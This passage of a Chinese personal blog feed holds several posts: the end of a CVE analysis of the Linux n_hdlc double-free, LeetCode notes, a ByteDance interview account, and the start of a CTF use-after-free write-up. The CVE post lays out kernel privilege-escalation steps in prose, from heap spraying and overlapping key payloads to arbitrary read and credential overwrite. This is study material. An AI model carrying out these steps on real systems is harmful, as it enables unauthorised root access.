tty_struct *, struct file *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>),</span></span></span><br><span class="line"><span class="function"><span class="params">    struct tty_struct *tty,</span></span></span><br><span class="line"><span class="function"><span class="params">    struct file *file,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> ret, written = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> chunk;</span><br><span class="line"></span><br><span class="line">    ret = tty_write_lock(tty, file-&gt;f_flags &amp; O_NDELAY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    chunk = <span class="number">2048</span>;    <span class="comment">/* 默认大小为2048 */</span></span><br><span class="line">    <span class="keyword">if</span> (test_bit(TTY_NO_WRITE_SPLIT, &amp;tty-&gt;flags))</span><br><span class="line">        chunk = <span class="number">65536</span>;    <span class="comment">/* 如果标志置位, 则扩充大小到65536 */</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt; chunk)</span><br><span class="line">        chunk = count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write_buf/write_cnt is protected by the atomic_write_lock mutex */</span></span><br><span class="line">    <span class="keyword">if</span> (tty-&gt;write_cnt &lt; chunk) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf_chunk;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (chunk &lt; <span class="number">1024</span>)</span><br><span class="line">            chunk = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">        buf_chunk = kmalloc(chunk, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!buf_chunk) &#123;</span><br><span class="line">            ret = -ENOMEM;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        kfree(tty-&gt;write_buf);</span><br><span class="line">        tty-&gt;write_cnt = chunk;</span><br><span class="line">        tty-&gt;write_buf = buf_chunk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do the write .. */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    tty_write_unlock(tty);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>结合上述 encrypted_key_payload 和 tty_struct.write_buf，完成利用。</p><ul><li>准备工作<ul><li>堆喷，准备大量的所需大小的对象，放入内核空间，便于后续的检测反馈。（难道这就是我最不会的堆风水？）</li><li>一个 user-type 的 key，encrypted key 需要这个。</li></ul></li><li>一个或多个 encrypted 的 key，消耗 key 的总大小，便于后续的检测反馈。</li><li>触发 double-free。</li><li>(交替)申请 write_buf，encrypted_key_payload 对象(使用 encrypted_update 函数)。这个可能需要根据漏洞具体的环境来看申请的对象的顺序。</li><li>检测 encrypted_update 的返回值，如果为 EINVAL，则判断此时的内核空间中两个对象重叠。（目地达成，耶）</li><li>不停的调用 encrypted_update 检测合适的 master_desc 的位置。由于在 read 函数中需要 master_desc 的值，所以我们首先需要遍历内核空间，找到所需要的字串。所以我们设置好 encrypted_update 的参数(通过write_buf)，使调用过程如下：encrypted_update -&gt; encrypted_key_alloc -&gt; key_payload_reserve。当其返回 EDQUOT 时，即找到对应的 master_desc。在准备工作中的堆喷和消耗 key 的总大小，即是为了找到这个 master_desc。</li><li>此时已经具备任意地址读的能力。检测 init_task，或者检测相应的 task_struct 结构中的 comm 字段，找到目标进程的 task_struct 地址，然后获取 cred 地址。</li><li>调用 encrypted_destroy，完成提权。这个函数的调用需要先 keyctl_revoke，它只是将 key 进行一下标记，然后调用 gc。在测试过程中发现，在 keyctl_revoke 之后，立即调用 add_key 来申请一个与需要 destroy 的 key 相同的 payload，会立即触发 encrypted_destory 函数。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次分析 CVE，感觉发现漏洞利用点很重要，可能不是常规的 double-free，是因为条件竞争产生的伪 dbf；然后如何利用，找一些有用的辅助函数，玩好堆风水很重要，不像 pwn 题中可以准确推测出内存布局。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot; class=&quot;headerlink&quot; title=&quot;漏洞点&quot;&gt;&lt;/a&gt;漏洞点&lt;/h2&gt;&lt;p&gt;在 &lt;code&gt;drivers/tty/n_hdlc.c&lt;/code&gt; 中存在竞争条件，同一个对象可以两次被加入到一个将被 free
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
      <category term="cve" scheme="https://github.com/Cracke-S-J/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>每天几道 算法</title>
    <link href="https://github.com/Cracke-S-J/2020/02/14/algorithm/"/>
    <id>https://github.com/Cracke-S-J/2020/02/14/algorithm/</id>
    <published>2020-02-13T17:07:29.000Z</published>
    <updated>2020-03-05T15:35:50.038Z</updated>
    
    <content type="html"><![CDATA[<p>跟 dyf 聊天，扯起了算法，从高三 oi 退役以来，就大一冬天看过一阵算法，去梆梆之后就基本再也没看过了，于是就上 leetcode 刷了几道，难度相比竞赛来说还是弱的很，但是挺有意思的。</p><h2 id="爬楼梯问题"><a href="#爬楼梯问题" class="headerlink" title="爬楼梯问题"></a>爬楼梯问题</h2><p>就是一个线性 dp，dp[i] = min(dp[i-1]+val[i-1], dp[i-2]+val[i-2])，当前状态是由走一步或者走两步来的。</p><h2 id="找第一个不重复的字母"><a href="#找第一个不重复的字母" class="headerlink" title="找第一个不重复的字母"></a>找第一个不重复的字母</h2><p>水题，不表。</p><h2 id="出现前-k-多的字符串"><a href="#出现前-k-多的字符串" class="headerlink" title="出现前 k 多的字符串"></a>出现前 k 多的字符串</h2><p>STL 排排序就行。</p><h2 id="数组组三角形"><a href="#数组组三角形" class="headerlink" title="数组组三角形"></a>数组组三角形</h2><p>左右指针移动计数，O(n^2)。</p><h2 id="毒死猪"><a href="#毒死猪" class="headerlink" title="毒死猪"></a>毒死猪</h2><p>这个挺有意思，可以算机智题或建模。假设有 n 只水桶，猪饮水中毒后会在 m 分钟内死亡，你需要多少猪（x）就能在 p 分钟内找出 “有毒” 水桶？这 n 只水桶里有且仅有一只有毒的桶。x = (p/m+1)根号(n)。</p><h2 id="铺地板"><a href="#铺地板" class="headerlink" title="铺地板"></a>铺地板</h2><p>你是一位施工队的工长，根据设计师的要求准备为一套设计风格独特的房子进行室内装修。房子的客厅大小为 n x m，为保持极简的风格，需要使用尽可能少的 正方形 瓷砖来铺盖地面。假设正方形瓷砖的规格不限，边长都是整数。(1 &lt;= n &lt;= 13, 1 &lt;= m &lt;= 13)</p><p>看起来像可恶的 dp，一共有三种情况，两个块横着拼或竖着拼，还有一种是四个块围起来，中间一个 1x1 的小块，O((m*n)^2) = 2,924,207，合适。</p><h2 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2><p>给定一个所有节点为非负值的二叉搜索树,求树中任意两节点的差的绝对值的最小值。</p><p>知识点是二叉搜索树，它的中序遍历是从小到大排序的。</p><h2 id="回文字典序"><a href="#回文字典序" class="headerlink" title="回文字典序"></a>回文字典序</h2><p>一道无聊的模拟题。</p><h2 id="奇偶跳"><a href="#奇偶跳" class="headerlink" title="奇偶跳"></a>奇偶跳</h2><p>给定一个整数数组 A，你可以从某一起始索引出发，跳跃一定次数。在你跳跃的过程中，第 1、3、5… 次跳跃称为奇数跳跃，而第 2、4、6… 次跳跃称为偶数跳跃。</p><p>你可以按以下方式从索引 i 向后跳转到索引 j（其中 i &lt; j）：</p><p>在进行奇数跳跃时（如，第 1，3，5… 次跳跃），你将会跳到索引 j，使得 A[i] &lt;= A[j]，A[j] 是可能的最小值。如果存在多个这样的索引 j，你只能跳到满足要求的最小索引 j 上。<br>在进行偶数跳跃时（如，第 2，4，6… 次跳跃），你将会跳到索引 j，使得 A[i] =&gt; A[j]，A[j] 是可能的最大值。如果存在多个这样的索引 j，你只能跳到满足要求的最小索引 j 上。<br>（对于某些索引 i，可能无法进行合乎要求的跳跃。）<br>如果从某一索引开始跳跃一定次数（可能是 0 次或多次），就可以到达数组的末尾（索引 A.length - 1），那么该索引就会被认为是好的起始索引。</p><p>返回好的起始索引的数量。</p><p>这显然是一道 dp 题。</p><p>f(i, 0) = f(j, 1)<br>f(i, 1) = f(k, 0)<br>j 表示奇数跳的下一个位置，k 表示偶数跳的下一个位置。</p><p>下一个位置的预处理可以用单调队列。</p><h2 id="合并两个数组"><a href="#合并两个数组" class="headerlink" title="合并两个数组"></a>合并两个数组</h2><p>无聊的排序。</p><h2 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h2><p>无聊的字符串处理题。</p><h2 id="我的日程安排表"><a href="#我的日程安排表" class="headerlink" title="我的日程安排表"></a>我的日程安排表</h2><p>看起来这么像线段树呢，其实不用，遍历就行。前缀和差分也行。</p><h2 id="不喜欢问题"><a href="#不喜欢问题" class="headerlink" title="不喜欢问题"></a>不喜欢问题</h2><p>有点像囚犯打架问题，着色。</p><h2 id="奇怪的打印机"><a href="#奇怪的打印机" class="headerlink" title="奇怪的打印机"></a>奇怪的打印机</h2><p>有台奇怪的打印机有以下两个特殊要求：</p><ol><li>打印机每次只能打印同一个字符序列。</li><li>每次可以在任意起始和结束位置打印新字符，并且会覆盖掉原来已有的字符。</li></ol><p>事出有幺，必为 dp，有一种合并石子的感 jio。可是合并石子我已经忘了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 枚举长度</span><br><span class="line">    <span class="keyword">for</span> 枚举边界</span><br><span class="line">        <span class="keyword">for</span> 枚举边界中的 k</span><br><span class="line">            f[l][r] = min(f[l][r], f[l][k - <span class="number">1</span>] + f[k + <span class="number">1</span>][r]);</span><br></pre></td></tr></table></figure><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>代码能力题，两个栈。现在再写，有一种 tm 语法树的感觉。</p><h2 id="迟到"><a href="#迟到" class="headerlink" title="迟到"></a>迟到</h2><p>水模拟。</p><h2 id="种花"><a href="#种花" class="headerlink" title="种花"></a>种花</h2><p>水模拟。</p><h2 id="还是不喜欢问题"><a href="#还是不喜欢问题" class="headerlink" title="还是不喜欢问题"></a>还是不喜欢问题</h2><p>。</p><h2 id="子串独特字符"><a href="#子串独特字符" class="headerlink" title="子串独特字符"></a>子串独特字符</h2><p>如果一个字符在字符串 S 中有且仅有出现一次，那么我们称其为独特字符。</p><p>例如，在字符串 S = “LETTER” 中，”L” 和 “R” 可以被称为独特字符。</p><p>我们再定义 UNIQ(S) 作为字符串 S 中独特字符的个数。</p><p>那么，在 S = “LETTER” 中， UNIQ(“LETTER”) =  2。</p><p>对于给定字符串 S，计算其所有非空子串的独特字符的个数（即 UNIQ(substring)）之和。</p><p>如果在 S 的不同位置上出现两个甚至多个相同的子串，那么我们认为这些子串是不同的。</p><p>考虑到答案可能会非常大，规定返回格式为：结果 mod 10 ^ 9 + 7。</p><p>说明: 0 &lt;= S.length &lt;= 10000。</p><p><code>f[i] = f[i − 1] + (i + n[i] − 2 ∗ m[i])</code> 瞎鸡推一下推来的。</p><p><code>f[i] = sum(1 to i - 1 -&gt; i)</code></p><h2 id="滑砖拼图"><a href="#滑砖拼图" class="headerlink" title="滑砖拼图"></a>滑砖拼图</h2><p>是什么华容道游戏，bfs。</p><h2 id="还是猪"><a href="#还是猪" class="headerlink" title="还是猪"></a>还是猪</h2><p>。</p><h2 id="优美排列"><a href="#优美排列" class="headerlink" title="优美排列"></a>优美排列</h2><p>假设有从 1 到 N 的 N 个整数，如果从这 N 个数字中成功构造出一个数组，使得数组的第 i 位 (1 &lt;= i &lt;= N) 满足如下两个条件中的一个，我们就称这个数组为一个优美的排列。条件：</p><ul><li>第 i 位的数字能被 i 整除</li><li>i 能被第 i 位上的数字整除</li></ul><p>现在给定一个整数 N，请问可以构造多少个优美的排列？（N &lt;= 15）</p><p>暴力的气息哈哈哈哈。dfs。</p><h2 id="连网线"><a href="#连网线" class="headerlink" title="连网线"></a>连网线</h2><p>并查集，只要大于 n - 1 条边，就是块数 - 1，否则不行。</p><h2 id="数据流不相交区间"><a href="#数据流不相交区间" class="headerlink" title="数据流不相交区间"></a>数据流不相交区间</h2><p>给定一个非负整数的数据流输入 a1，a2，…，an，…，将到目前为止看到的数字总结为不相交的区间列表。</p><p>例如，假设数据流中的整数为 1，3，7，2，6，…，每次的总结为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">3</span>], [<span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>], [<span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>], [<span class="number">6</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><p>讲真一开始没看懂。后来，就插入就完了。</p><p>最后 3 秒提交通过，稳…</p><h2 id="填数独"><a href="#填数独" class="headerlink" title="填数独"></a>填数独</h2><p>dfs 回溯。会爆栈，可以用空间优化时间。</p><h2 id="二叉树的祖父结点"><a href="#二叉树的祖父结点" class="headerlink" title="二叉树的祖父结点"></a>二叉树的祖父结点</h2><p><code>dfs(gp_val, p_val, node);</code></p><h2 id="返回重复子树"><a href="#返回重复子树" class="headerlink" title="返回重复子树"></a>返回重复子树</h2><p>又让我想起了 compiler…用 map 映射，然后花式遍历。</p><h2 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h2><p>就是想让写一下链表反转。</p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>两行代码…</p><h2 id="词根"><a href="#词根" class="headerlink" title="词根"></a>词根</h2><p>在英语中，我们有一个叫做 词根(root)的概念，它可以跟着其他一些词组成另一个较长的单词——我们称这个词为 继承词(successor)。例如，词根an，跟随着单词 other(其他)，可以形成新的单词 another(另一个)。</p><p>现在，给定一个由许多词根组成的词典和一个句子。你需要将句子中的所有继承词用词根替换掉。如果继承词有许多可以形成它的词根，则用最短的词根替换它。</p><p>这个是给单词建图…快的话建个数组模拟邻接表。</p><h2 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h2><p>这小范围，写个 bfs 就行。</p><h2 id="找数"><a href="#找数" class="headerlink" title="找数"></a>找数</h2><p>给定一个大小为 n 的数组，找出其中所有出现超过 ⌊ n/3 ⌋ 次的元素。</p><p>说明: 要求算法的时间复杂度为 O(n)，空间复杂度为 O(1)。</p><p>这个算法叫摩尔投票算法？？</p><h2 id="建二叉搜索树"><a href="#建二叉搜索树" class="headerlink" title="建二叉搜索树"></a>建二叉搜索树</h2><h2 id="边框着色"><a href="#边框着色" class="headerlink" title="边框着色"></a>边框着色</h2><p>dfs。</p><h2 id="判断是否是子串"><a href="#判断是否是子串" class="headerlink" title="判断是否是子串"></a>判断是否是子串</h2><p>双指针。</p><h2 id="切砖"><a href="#切砖" class="headerlink" title="切砖"></a>切砖</h2><p>智力题。</p><h2 id="猜数"><a href="#猜数" class="headerlink" title="猜数"></a>猜数</h2><p>智力题。</p><h2 id="位运算加法"><a href="#位运算加法" class="headerlink" title="位运算加法"></a>位运算加法</h2><p>c++ 编译选项加的有毒？我就是成心让它溢出的，佛，最后用 js 写过了。</p><h2 id="增减字符串"><a href="#增减字符串" class="headerlink" title="增减字符串"></a>增减字符串</h2><p>a~，又让我想起单调队列了…不过好像是个 O(n) 的模拟题。</p><h2 id="字母板上的路径"><a href="#字母板上的路径" class="headerlink" title="字母板上的路径"></a>字母板上的路径</h2><p>让我想起了曼哈顿距离…其实没啥关系，是道水题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;跟 dyf 聊天，扯起了算法，从高三 oi 退役以来，就大一冬天看过一阵算法，去梆梆之后就基本再也没看过了，于是就上 leetcode 刷了几道，难度相比竞赛来说还是弱的很，但是挺有意思的。&lt;/p&gt;
&lt;h2 id=&quot;爬楼梯问题&quot;&gt;&lt;a href=&quot;#爬楼梯问题&quot; class
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="算法" scheme="https://github.com/Cracke-S-J/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>字跳面试实况转播</title>
    <link href="https://github.com/Cracke-S-J/2020/02/05/bytedanceinterview/"/>
    <id>https://github.com/Cracke-S-J/2020/02/05/bytedanceinterview/</id>
    <published>2020-02-05T08:06:01.000Z</published>
    <updated>2020-02-05T10:25:12.423Z</updated>
    
    <content type="html"><![CDATA[<p>岗位是 Android Native 层开发，团队部门啥的我都不知道，具体干啥我也不知道。</p><p>视频面一次，现场一次。在此我要吐槽视频面，第一是晚上，反正是各种不行，一开始是我进不去，面试官让我多进几次，他也是进了好几次，我各种重启、重新进，终于进去了，然后各种听不见声音，各种看不见对方，通过双方不断地玄学重进之后，终于我能听到面试官的声音，能看到双方画面，他能听见我的声音，看不到我的画面，到此已经45分钟过去了，然后面试官放弃了，说改天，以至于折腾了45分钟，面试官终于还是没有成功地看到我的脸。。。</p><p>还有一个前提是我没准备，真的没准备，5 分钟翻了翻 java 的 hello world 怎么写，因为在 xc5 还没太干够，而且大二下的课确实也多点，字跳的管理应该也会比较严，不方便随时失踪。</p><p>细节记不清了（嘤嘤），大致是下面这样（两面杂揉到一起）。</p><p>面试官：先介绍一下自己。</p><p>我：叽里呱啦…(谦虚地吹13)。</p><p>面试官：你玩游戏吗？</p><p>我：不玩。</p><p>面试官：为什么不玩，详细说说。</p><p>我：（？）小时候爱玩，长大不爱玩了。</p><p>面试官：为什么。</p><p>我：（？）写代码以后就不爱打游戏了。</p><p>（沉默…）</p><p>面试官：继续。</p><p>我：（？wdnmd 还要我说啥）现在只玩养生游戏。</p><p>面试官：我们先来问一些基础问题。</p><p>我：（wdnmd）终于开始了。</p><p>面试官：说一下 c 语言函数调用过程，说一下虚函数在类中的内存分布。</p><p>我：blablah…</p><p>面试官：说一下 Android 打包过程。</p><p>我：忘了。</p><p>面试官：说一下 Apk 包里有哪些东西。</p><p>我：classes.dex lib ….</p><p>面试官：说一下 打包过程。</p><p>我：忘了顺序了。</p><p>面试官：说一下 Android 四大组件，Layout 什么的。</p><p>我：<del>爷</del>忘了（哈哈哈哈）。</p><p>面试官：说一下 java 四种引用的区别，重载和重写的区别。</p><p>我：重载是….重写是….，四种引用忘了。</p><p>面试官：Java GC 说一下。</p><p>我：什么代代代代，这样那样……</p><p>（相信我当初面梆梆的时候这些东西可会了，好久没看是真的忘）。</p><p>然后开始聊过往经历。</p><p>我：（劳资开始了）Android 有三种加固，分别是，C++ Java 混淆能怎么怎么做，我是怎么日微信和支付宝的，我是怎么上马甲包的……</p><p>面试官：还有什么没<del>吹</del>讲到的吗？</p><p>我：应该没有了。</p><p>下面是重头戏，算法：（字跳一直是很重算法的（摊手.gif））</p><p>手写算法：</p><ul><li>冒泡排序（是我有罪，竟然没写好）</li><li>LCA（这个<del>爷</del>我会，写写写…）</li></ul><p>面试官：不准用额外空间，不准改变树的结构。</p><p>我：（<del>爷</del>不会了）瞎丁丁写。</p><p>（因为我的算法都是高中时打 noip 学的，重速度不重空间，所以我会的 LCA 带个额外的预处理的结点深度，然后树上倍增，查询时间复杂度是 O(logn)，可是面试官不让这么弄，所以我开始瞎造，其实应该忽略时间复杂度，先写一个再说，面试官心里预期可能就写个 O(nlogn)的就行）</p><p>视频在线算法：</p><ul><li>二叉树已知先序和中序，求后序。</li></ul><p>面试官：代码能力怎么样。</p><p>我：还行吧，高中时候会写算法，现在好久不看了。</p><p>（疯狂回想先序中序后序是什么来着，印象中写了挺久的，但是也算写出来了吧哈哈哈哈）。</p><p>现场还问了一个脑筋急转弯，一根木棍燃烧一小时，给一把木棍，怎么取 45 分钟。</p><p>这个把戏我之前听说过，然后我故作沉思后<del>章</del>张口就来。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;岗位是 Android Native 层开发，团队部门啥的我都不知道，具体干啥我也不知道。&lt;/p&gt;
&lt;p&gt;视频面一次，现场一次。在此我要吐槽视频面，第一是晚上，反正是各种不行，一开始是我进不去，面试官让我多进几次，他也是进了好几次，我各种重启、重新进，终于进去了，然后各种听
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="面试体验" scheme="https://github.com/Cracke-S-J/tags/%E9%9D%A2%E8%AF%95%E4%BD%93%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>每天一道 PWN</title>
    <link href="https://github.com/Cracke-S-J/2020/01/21/daily-pwn/"/>
    <id>https://github.com/Cracke-S-J/2020/01/21/daily-pwn/</id>
    <published>2020-01-21T09:22:42.000Z</published>
    <updated>2020-03-06T10:31:05.006Z</updated>
    
    <content type="html"><![CDATA[<p>ssj 最近闲的*疼，决定每天写一道 pwn 题（也可能是几道）。</p><h2 id="2020-1-21"><a href="#2020-1-21" class="headerlink" title="2020-1-21"></a>2020-1-21</h2><h3 id="UAF-lab-10-hacknote"><a href="#UAF-lab-10-hacknote" class="headerlink" title="UAF - lab 10 hacknote"></a>UAF - lab 10 hacknote</h3><p>主要有四个功能。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure><p>下面是稍微整理过的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add note</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    最多添加 5 个 note，放在一个 notelist 里，目测出  note 的结构是这样的，</span></span><br><span class="line"><span class="comment">    struct note &#123;</span></span><br><span class="line"><span class="comment">        int (*func_ptr)(int); // print_note_content</span></span><br><span class="line"><span class="comment">        char *content;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)notelist[i] = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="keyword">void</span> **)notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// delete note</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    free note 和 content. 但是两个指针都没有被设置 nullptr.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span 